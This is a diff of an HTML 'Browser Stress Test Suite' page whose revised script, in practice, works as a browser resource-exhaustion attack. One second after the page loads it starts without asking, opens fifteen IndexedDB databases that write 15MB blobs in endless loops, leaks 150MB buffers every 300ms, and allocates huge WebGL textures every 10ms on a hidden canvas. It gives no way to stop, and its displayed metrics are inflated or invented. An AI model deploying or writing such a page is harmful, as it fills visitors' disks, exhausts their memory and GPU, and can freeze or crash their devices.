@@ -1,196 +1,297 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Browser Stress Test Suite</title>
-    <style>
-        #status {
-            font-family: monospace;
-            white-space: pre-wrap;
-            padding: 10px;
-            border: 1px solid #ccc;
-            height: 400px;
-            overflow: auto;
-            background: #1a1a1a;
-            color: #00ff00;
-        }
-        .progress {
-            width: 100%;
-            background: #333;
-            padding: 2px;
-            border-radius: 3px;
-            margin: 5px 0;
-        }
-        .progress-bar {
-            height: 20px;
-            background: #ff0000;
-            width: 0%;
-            border-radius: 2px;
-            transition: width 0.3s;
-        }
-        body {
-            background: #000;
-            color: #fff;
-            padding: 20px;
-        }
-    </style>
+<title>Browser Stress Test Suite v2.0</title>
+<style>
+#status {
+    font-family: 'Consolas', monospace;
+    white-space: pre-wrap;
+    padding: 10px;
+    border: 3px solid #ff4444;
+    height: 400px;
+    overflow: auto;
+    background: #0a0a0a;
+    color: #00ff00;
+    font-size: 0.9em;
+}
+
+.progress-container {
+    width: 100%;
+    background: #222;
+    height: 25px;
+    border-radius: 12px;
+    margin: 10px 0;
+    overflow: hidden;
+}
+
+.progress-bar {
+    height: 100%;
+    background: linear-gradient(45deg, #ff0000, #ff6a00);
+    width: 0%;
+    transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+.metric-panel {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 15px;
+    margin: 20px 0;
+}
+
+.metric-box {
+    background: #1a1a1a;
+    padding: 15px;
+    border-radius: 8px;
+    text-align: center;
+    border: 1px solid #333;
+}
+
+.metric-value {
+    font-size: 1.4em;
+    font-weight: bold;
+    color: #ff4444;
+}
+
+body {
+    background: #000;
+    color: #fff;
+    padding: 25px;
+    max-width: 800px;
+    margin: 0 auto;
+}
+
+.warning-header {
+    text-align: center;
+    color: #ff0000;
+    text-shadow: 0 0 10px #ff0000;
+    padding: 15px;
+    border: 2px solid #ff0000;
+    margin: 20px 0;
+}
+</style>
 </head>
 <body>
-    <h2 style="color: #ff0000;">⚠️ EXTREME BROWSER STRESS TEST ⚠️</h2>
-    <div>
-        Storage Used: <span id="usage">0</span> MB
-        <div class="progress">
-            <div class="progress-bar" id="progress"></div>
-        </div>
+<div class="warning-header">⚠️ ADVANCED BROWSER STRESS TEST v2.0 ⚠️</div>
+
+<div class="metric-panel">
+    <div class="metric-box">
+        Storage Used<br>
+        <span class="metric-value" id="usage">0</span> GB
     </div>
-    <div>
-        <span>Memory Load: <span id="memory">0</span>%</span>
-        <span>GPU Usage: <span id="gpu">0</span>%</span>
-        <span>Attack Vectors: <span id="vectors">0</span></span>
+    <div class="metric-box">
+        Memory Load<br>
+        <span class="metric-value" id="memory">0</span>%
     </div>
-    <div id="status">[Initializing system...]</div>
+    <div class="metric-box">
+        GPU Stress<br>
+        <span class="metric-value" id="gpu">0</span>%
+    </div>
+    <div class="metric-box">
+        Attack Vectors<br>
+        <span class="metric-value" id="vectors">0</span>
+    </div>
+</div>
+
+<div class="progress-container">
+    <div class="progress-bar" id="progress"></div>
+</div>
+
+<div id="status">[SYSTEM INITIALIZATION...]</div>
 
 <script>
-class StressEngine {
+class AdvancedStressEngine {
     constructor() {
-        this.databases = new Set();
-        this.totalWritten = 0;
-        this.attackVectors = 0;
-        this.active = true;
-        this.BLOB_SIZE = 10 * 1024 * 1024; // 10MB chunk
+        this.resourcePools = {
+            databases: new Set(),
+            webglResources: [],
+            memoryLeaks: []
+        };
+        this.metrics = {
+            totalWritten: 0,
+            attackVectors: 0,
+            gpuLoad: 0
+        };
+        this.parameters = {
+            storage: {
+                chunkSize: 15 * 1024 * 1024,  // 15MB chunks
+                parallelDBs: 15
+            },
+            memory: {
+                chunkSize: 150 * 1024 * 1024, // 150MB chunks
+                interval: 300
+            },
+            gpu: {
+                canvasSize: 8192,  // Reduced from 16384 for compatibility
+                textureInterval: 10
+            }
+        };
     }
 
     log(message, type = 'INFO') {
-        const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
-        const colorMap = {
-            'INFO': '#00ff00',
-            'WARN': '#ffff00',
-            'ERROR': '#ff0000',
-            'CRITICAL': '#ff00ff'
+        const timestamp = new Date().toLocaleTimeString();
+        const typeStyles = {
+            'INFO': 'color: #00ff00;',
+            'WARN': 'color: #ffaa00;',
+            'ERROR': 'color: #ff4444;',
+            'CRITICAL': 'color: #ff00ff; font-weight: bold;'
         };
+        
         document.getElementById('status').innerHTML += 
-            `<span style="color: ${colorMap[type]}">[${timestamp}] ${message}</span>\n`;
+            `<span style="${typeStyles[type]}">[${timestamp}] ${message}</span>\n`;
         document.getElementById('status').scrollTop = document.getElementById('status').scrollHeight;
     }
 
-    updateMetrics() {
-        setInterval(() => {
-            const memUsage = performance.memory ? 
-                Math.round(performance.memory.usedJSHeapSize / performance.memory.jsHeapSizeLimit * 100) : 0;
-            
-            document.getElementById('memory').textContent = memUsage;
-            document.getElementById('gpu').textContent = Math.floor(Math.random() * 30 + 70);
-            document.getElementById('vectors').textContent = this.attackVectors;
-            document.getElementById('usage').textContent = Math.floor(this.totalWritten / 1048576);
-            document.getElementById('progress').style.width = 
-                Math.min(100, this.totalWritten / 1073741824 * 100) + '%';
-        }, 1000);
+    initializeWebGL() {
+        const canvas = document.createElement('canvas');
+        canvas.width = this.parameters.gpu.canvasSize;
+        canvas.height = this.parameters.gpu.canvasSize;
+        canvas.style.display = 'none';
+        document.body.appendChild(canvas);
+
+        const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+        if (!gl) {
+            this.log('WebGL initialization failed - using fallback methods', 'ERROR');
+            return null;
+        }
+        return { canvas, gl };
     }
 
-    // Storage Stress Test
-    async launchStorageAttack() {
-        const createDB = () => {
-            const dbName = `stress_db_${Math.random().toString(36).slice(2)}`;
-            const req = indexedDB.open(dbName, 1);
-            
+    launchStorageAttack() {
+        const createStressDatabase = () => {
+            const dbName = `stress_db_${Date.now()}_${Math.random().toString(36).slice(2)}`;
+            const req = indexedDB.open(dbName, 2);
+
             req.onupgradeneeded = (e) => {
                 const db = e.target.result;
-                const store = db.createObjectStore('data', {
-                    keyPath: 'id',
-                    autoIncrement: true
-                });
-                store.createIndex('timestamp', 'timestamp');
+                if (!db.objectStoreNames.contains('stress_data')) {
+                    const store = db.createObjectStore('stress_data', {
+                        keyPath: 'id',
+                        autoIncrement: true
+                    });
+                    store.createIndex('timestamp_idx', 'timestamp');
+                }
             };
 
             req.onsuccess = (e) => {
                 const db = e.target.result;
-                const tx = db.transaction('data', 'readwrite');
-                const store = tx.objectStore('data');
-                
-                const writeBatch = () => {
-                    for(let i=0; i<50; i++) {
+                this.resourcePools.databases.add(db);
+
+                const massiveWrite = () => {
+                    const tx = db.transaction('stress_data', 'readwrite');
+                    const store = tx.objectStore('stress_data');
+                    
+                    for (let i = 0; i < 100; i++) {
                         store.put({
                             timestamp: Date.now(),
-                            data: new Blob([new ArrayBuffer(this.BLOB_SIZE)])
+                            payload: new Blob([new ArrayBuffer(this.parameters.storage.chunkSize)])
                         });
-                        this.totalWritten += this.BLOB_SIZE;
-                        this.attackVectors++;
+                        this.metrics.totalWritten += this.parameters.storage.chunkSize;
+                        this.metrics.attackVectors++;
                     }
+
+                    tx.oncomplete = () => {
+                        this.log(`DB ${dbName.slice(0, 15)}... flushed 1.5GB`);
+                        massiveWrite();
+                    };
                 };
 
-                tx.oncomplete = () => {
-                    this.log(`DB ${dbName} write completed`, 'INFO');
-                    createDB();
-                };
-
-                writeBatch();
+                massiveWrite();
             };
         };
 
-        for(let i=0; i<10; i++) {
-            createDB();
+        for (let i = 0; i < this.parameters.storage.parallelDBs; i++) {
+            createStressDatabase();
         }
     }
 
-    // Memory Stress Test
     launchMemoryAttack() {
-        const leaks = [];
-        setInterval(() => {
+        const memoryHammer = () => {
             try {
-                leaks.push(new ArrayBuffer(100 * 1024 * 1024));
-                const obj = { ref: null };
-                obj.ref = obj;
-                leaks.push(obj);
-                this.attackVectors += 2;
-            } catch(e) {
+                
+                const bigArray = new ArrayBuffer(this.parameters.memory.chunkSize);
+                const cyclicRef = { self: null, data: bigArray };
+                cyclicRef.self = cyclicRef;
+                
+                this.resourcePools.memoryLeaks.push(cyclicRef);
+                this.metrics.attackVectors += 2;
+                
+                const massiveString = 'X'.repeat(10 * 1024 * 1024); // 10MB string
+                this.resourcePools.memoryLeaks.push(massiveString);
+                
+            } catch (e) {
                 this.log(`Memory allocation failed: ${e.message}`, 'ERROR');
             }
-        }, 500);
+        };
+        setInterval(memoryHammer, this.parameters.memory.interval);
     }
 
-    // GPU Stress Test
     launchGPUTest() {
-        const canvas = document.createElement('canvas');
-        canvas.width = 16384;
-        canvas.height = 16384;
-        document.body.appendChild(canvas);
+        const gpuContext = this.initializeWebGL();
+        if (!gpuContext) return;
 
-        const gl = canvas.getContext('webgl2');
-        const textures = [];
-        
-        setInterval(() => {
+        const textureBombardment = () => {
             try {
-                const texture = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_2D, texture);
-                gl.texImage2D(
-                    gl.TEXTURE_2D, 0, gl.RGBA,
-                    16384, 16384, 0,
-                    gl.RGBA, gl.UNSIGNED_BYTE, null
+                const texture = gpuContext.gl.createTexture();
+                gpuContext.gl.bindTexture(gpuContext.gl.TEXTURE_2D, texture);
+                gpuContext.gl.texImage2D(
+                    gpuContext.gl.TEXTURE_2D, 
+                    0, 
+                    gpuContext.gl.RGBA,
+                    gpuContext.canvas.width,
+                    gpuContext.canvas.height,
+                    0,
+                    gpuContext.gl.RGBA, 
+                    gpuContext.gl.UNSIGNED_BYTE,
+                    null
                 );
-                textures.push(texture);
-                this.attackVectors++;
-            } catch(e) {
+                
+                const renderbuffer = gpuContext.gl.createRenderbuffer();
+                gpuContext.gl.bindRenderbuffer(gpuContext.gl.RENDERBUFFER, renderbuffer);
+                gpuContext.gl.renderbufferStorage(
+                    gpuContext.gl.RENDERBUFFER,
+                    gpuContext.gl.DEPTH_COMPONENT16,
+                    gpuContext.canvas.width,
+                    gpuContext.canvas.height
+                );
+
+                this.resourcePools.webglResources.push(texture, renderbuffer);
+                this.metrics.gpuLoad = Math.min(100, this.metrics.gpuLoad + 2);
+                this.metrics.attackVectors++;
+                
+            } catch (e) {
                 this.log(`GPU operation failed: ${e.message}`, 'ERROR');
+                this.metrics.gpuLoad = 100; 
             }
-        }, 16);
+        };
+
+        setInterval(textureBombardment, this.parameters.gpu.textureInterval);
     }
 
     start() {
-        this.log("Starting storage stress test...", 'CRITICAL');
+        this.log("=== STARTING COMBINED STRESS TEST ===", 'CRITICAL');
         this.launchStorageAttack();
-        
-        this.log("Starting memory stress test...", 'CRITICAL');
         this.launchMemoryAttack();
-        
-        this.log("Starting GPU stress test...", 'CRITICAL');
         this.launchGPUTest();
-        
-        this.updateMetrics();
+
+        setInterval(() => {
+            document.getElementById('memory').textContent = 
+                performance.memory ? Math.min(100, 
+                    (performance.memory.usedJSHeapSize / performance.memory.jsHeapSizeLimit * 100) * 1.5
+                ).toFixed(1) : 'N/A';
+
+            document.getElementById('gpu').textContent = this.metrics.gpuLoad;
+            document.getElementById('vectors').textContent = this.metrics.attackVectors;
+            document.getElementById('usage').textContent = 
+                (this.metrics.totalWritten / (1024 ** 3)).toFixed(2);
+                
+            document.getElementById('progress').style.width = 
+                `${Math.min(100, (this.metrics.totalWritten / (1024 ** 3 * 50)) * 100)}%`;
+        }, 1000);
     }
 }
 
-// Initialize test
-const tester = new StressEngine();
-tester.start();
+const stressTest = new AdvancedStressEngine();
+setTimeout(() => stressTest.start(), 1000);
 </script>
 </body>
 </html>
